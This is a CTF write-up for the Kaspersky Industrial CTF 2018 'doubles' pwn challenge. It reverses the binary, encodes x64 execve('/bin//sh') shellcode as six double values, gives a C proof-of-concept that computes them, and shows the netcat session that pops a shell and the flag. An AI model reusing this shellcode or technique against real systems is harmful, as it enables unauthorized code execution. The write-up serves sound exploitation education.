---
layout: page
title: "Kaspersky Industrial CTF 2018 Writeup: doubles"
---

> doubles
>
> 635
>
> nc doubles.2018.ctf.kaspersky.com 10001
> 
> [doubles]({{ site.baseurl }}/ctfs/kasp2018/dubles/doubles)

This is a pwning challenge on a x64 Linux executable:

```
$ file doubles
doubles: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter 
/lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e5511e0c31ccc63eda7398cbbfdf1d479f4854cd, not stripped
```

The file is pretty small and disassembly reveals the following steps:

- Allocate ```0x1000``` bytes of memory with read/write/execute permissions
- Ask user for a number of inputs ```n``` (between 0 and 6) and then read ```n``` double values from input
- Put each 8-byte double value sequentially at the beginning of allocated memory area
- Put byte sequence ```31C0909090909090``` at offset ```0x70``` in the allocated memory. It decompiles to the following:

```
0:  31 c0                   xor    eax,eax
2:  90                      nop
3:  90                      nop
4:  90                      nop
5:  90                      nop
6:  90                      nop
7:  90                      nop 
```
- Put the sum of all entered doubles divided by ```n``` at offset ```0x78``` in the allocated memory area
- Zero out all registers and jump to offset ```0x70``` in the allocated memory:

```
4008C1 31 DB                                         xor     ebx, ebx
4008C3 31 C9                                         xor     ecx, ecx
4008C5 31 D2                                         xor     edx, edx
4008C7 31 FF                                         xor     edi, edi
4008C9 31 F6                                         xor     esi, esi
4008CB 31 ED                                         xor     ebp, ebp
4008CD 31 E4                                         xor     esp, esp
4008CF 31 E4                                         xor     esp, esp
4008D1 4D 31 C0                                      xor     r8, r8
4008D4 4D 31 C9                                      xor     r9, r9
4008D7 4D 31 D2                                      xor     r10, r10
4008DA 4D 31 DB                                      xor     r11, r11
4008DD 4D 31 E4                                      xor     r12, r12
4008E0 4D 31 ED                                      xor     r13, r13
4008E3 4D 31 F6                                      xor     r14, r14
4008E6 4D 31 FF                                      xor     r15, r15
4008E9 FF E0                                         jmp     rax
```

So the intent is fairly clear now - accept a bunch of double values from the user that, when stored, become the shellcode that exploits the application.

Unfortunately there are several complications here:

- Not every byte sequence represents a valid double value, so we will have to play with the commands in our shellcode to make them combine into valid doubles
- Before control is transferred to the shellcode all registers are cleared, including the ```esp``` - and we need valid stack for the shellcode to work
- The bytes at offset ```0x78``` are composed from all other double values, and at the same time they have to become a ```jmp``` to our shellcode

Max possible bytes we can input is ```6*8 = 48``` which is plenty for a x64 shellcode - we will use a [common short variant](https://www.exploit-db.com/exploits/36858/) for our purposes.

We have to add additional commands into the code so that it could be represented as valid doubles, so after some experimentation we arrive at the following working example that fits into 5 8-byte sequences:

```
0:  31 f6                   xor    esi,esi         ; filler code
2:  31 f6                   xor    esi,esi         ; filler code
4:  48 8d 25 ff 05 00 00    lea    rsp,[rip+0x5ff] ; allocate stack about mid-way through the memory area
b:  90                      nop                    ; filler code
c:  90                      nop                    ; filler code
d:  31 f6                   xor    esi,esi
f:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f ; load /bin//sh into rbx
16: 2f 73 68
19: 56                      push   rsi
1a: 53                      push   rbx
1b: 54                      push   rsp
1c: 5f                      pop    rdi
1d: 6a 3b                   push   0x3b
1f: 58                      pop    rax
20: 66 31 c9                xor    cx,cx           ; filler code
23: 31 d2                   xor    edx,edx
25: 0f 05                   syscall
27: ff                      .byte 0xff             ; filler junk byte
``` 
 
We can now come up with 6th double that will produce a valid ```jmp``` at offset ```0x78``` when combined with other doubles. For the ```jmp``` to be valid let us try for the following value ```j``` at that location: ```eb869090909090ff```, which decompiles to:

```
0:  eb 86                   jmp    0xffffffffffffff88 ; jump 122 bytes back
2:  90                      nop
3:  90                      nop
4:  90                      nop
5:  90                      nop
6:  90                      nop
7:  ff                      .byte 0xff 
```

Formula for 6th double becomes pretty simple:

```
d6 = j*6 - (d1+d2+d3+d4+d5)
```

Python's handling of long doubles is not very predictable, so let's write a piece of C code as our PoC:

```c
#include <stdio.h>
int main()
{
  char dc1[] = {0x31,0xf6,0x31,0xf6,0x48,0x8d,0x25,0xff};
  double d1 = *(double*)dc1;
  char dc2[] = {0x05,0x00,0x00,0x90,0x90,0x31,0xf6,0x48};
  double d2 = *(double*)dc2;
  double d3 = *(double*)"\xbb\x2f\x62\x69\x6e\x2f\x2f\x73";
  double d4 = *(double*)"\x68\x56\x53\x54\x5f\x6a\x3b\x58";
  double d5 = *(double*)"\x66\x31\xC9\x31\xd2\x0f\x05\xff";
	
  double j = *(double*)"\xeb\x86\x90\x90\x90\x90\x90\xff";
	
  printf("d1 = %lf\n\nd2 = %lf\n\nd3 = %lf\n\nd4 = %lf\n\nd5 = %lf\n\nj = %lf\n\n",d1,d2,d3,d4,d5,j);
   
  printf("sum = %lf\n\nj*6 = %lf\n\nd6 = %lf\n",d1+d2+d3+d4+d5,j*6,j*6-(d1+d2+d3+d4+d5));
   
  return 0;
}
```

When run we get the following values:

```
d1 = -29559091864572820292681211914927464797860470802238602797975133423556597190524648032648549717921251541252207615662565262295374628003076419760662954965978663312650403503266161258034199495885073994787156264246210982573198769108759875107127168181815354450326757138884460293640370406304322547625947123628900352.000000

d2 = 30933380527999897844181710530453929767993344.000000

d3 = 6813905293115760542120164628744098873719246634693038997721476826910022503981551850256229588569116520719267474398463574052616707022645722479718377571242630801186886685030914191052826781635181654745781180865715668825202440012912092967881823496437760.000000

d4 = 1080226375091073528021226343805715536002313604560130468987472238944077983639024984304711725399647812346738966255370240.000000

d5 = -7221728359051669221104524211471986207229634050470487507184666147640458850386807544095578717721216606254177370818620670478590545335985432672572436948742881130607592737182467980735839261026849649608088362430955077272509753119169582149912145378930118483238742739000059656808347887105107420583218873446170624.000000

j = -2908033012275735465345584273188774480244846208973146967303899150349685107885671012220806655752397208130581049387909425120052463248269430708062761141130806637840019732542185668620969062492161721433352994196491003929461564535255972897316734923212121386921972473231415147003098792468167203464949561206583066624.000000

sum = -36780820223624487077457233276399680916744507883912012586103085172445174323934841273506955744035942531102618515978621126447736115486894806568442925613948032798761172162285274355950613767793666176697830754163753971645810152423334738835639832212026736496974596010643116743514017517340043197752018499096543232.000000

j*6 = -17448198073654411544673312179932764596236131605814778011666357129937147208221999550067407516411842133184757863430143369881285501869307056765602824100788801865057744467233476311722268780524422505139042062452079034418421421871583341552143875088728735265997292059360892440068025957461477194315637848274492194816.000000

d6 = -17411417253430787730022521733256301459702771861318859449539907218820221387783610256487360223551207260781094790772872635300876985721018266617717101874188343046140106740644276985024479463753267900046830460511617016789947561785228149097614492108763079785999406930708876608438489354139287899764058539217469308928.000000
```

Now armed with these values we can simply paste them in our netcat session and get the flag:

```
$ nc -vv doubles.2018.ctf.kaspersky.com 10001
Connection to doubles.2018.ctf.kaspersky.com 10001 port [tcp/*] succeeded!
n: 6
-29559091864572820292681211914927464797860470802238602797975133423556597190524648032648549717921251541252207615662565262295374628003076419760662954965978663312650403503266161258034199495885073994787156264246210982573198769108759875107127168181815354450326757138884460293640370406304322547625947123628900352.000000
30933380527999897844181710530453929767993344.000000
6813905293115760542120164628744098873719246634693038997721476826910022503981551850256229588569116520719267474398463574052616707022645722479718377571242630801186886685030914191052826781635181654745781180865715668825202440012912092967881823496437760.000000
1080226375091073528021226343805715536002313604560130468987472238944077983639024984304711725399647812346738966255370240.000000
-7221728359051669221104524211471986207229634050470487507184666147640458850386807544095578717721216606254177370818620670478590545335985432672572436948742881130607592737182467980735839261026849649608088362430955077272509753119169582149912145378930118483238742739000059656808347887105107420583218873446170624.000000
-17411417253430787730022521733256301459702771861318859449539907218820221387783610256487360223551207260781094790772872635300876985721018266617717101874188343046140106740644276985024479463753267900046830460511617016789947561785228149097614492108763079785999406930708876608438489354139287899764058539217469308928.000000
cat flag.txt
KLCTF{h4ck1ng_w1th_d0ubl3s_1s_n0t_7ha7_t0ugh}
```

The flag is ```KLCTF{h4ck1ng_w1th_d0ubl3s_1s_n0t_7ha7_t0ugh}```.
